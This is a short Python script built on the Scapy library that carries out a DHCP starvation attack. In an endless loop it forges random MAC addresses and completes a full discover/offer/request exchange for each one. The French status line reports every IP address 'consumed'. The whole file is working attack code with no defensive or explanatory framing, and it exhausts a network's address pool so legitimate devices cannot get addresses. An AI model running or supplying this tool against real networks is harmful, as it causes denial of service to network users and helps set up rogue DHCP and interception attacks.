import random
import sys
from scapy.all import *

def generate_mac():
    parts = []
    for i in range(6):
        parts.append(format(random.randint(0, 255), '02x'))
    return ":".join(parts)

def send_dora(mac):
    mac_bytes = bytes.fromhex(mac.replace(":", ""))
    xid = random.randint(1, 2**32-1)

    discover = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac_bytes, xid=xid) /
        DHCP(options=[("message-type", "discover"), "end"])
    )

    offer = srp1(discover, iface="eth0", timeout=2, verbose=False, filter="udp and port 68")
    if not offer:
        return

    offered_ip = offer[BOOTP].yiaddr
    server_ip = offer[BOOTP].siaddr

    request = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac_bytes, xid=xid) /
        DHCP(options=[
            ("message-type", "request"),
            ("server_id", server_ip),
            ("requested_addr", offered_ip),
            "end"
        ])
    )

    srp1(request, iface="eth0", timeout=2, verbose=False, filter="udp and port 68")
    print(f"[+] IP {offered_ip} consommée avec MAC {mac}")

while True:
    mac = generate_mac()
    send_dora(mac)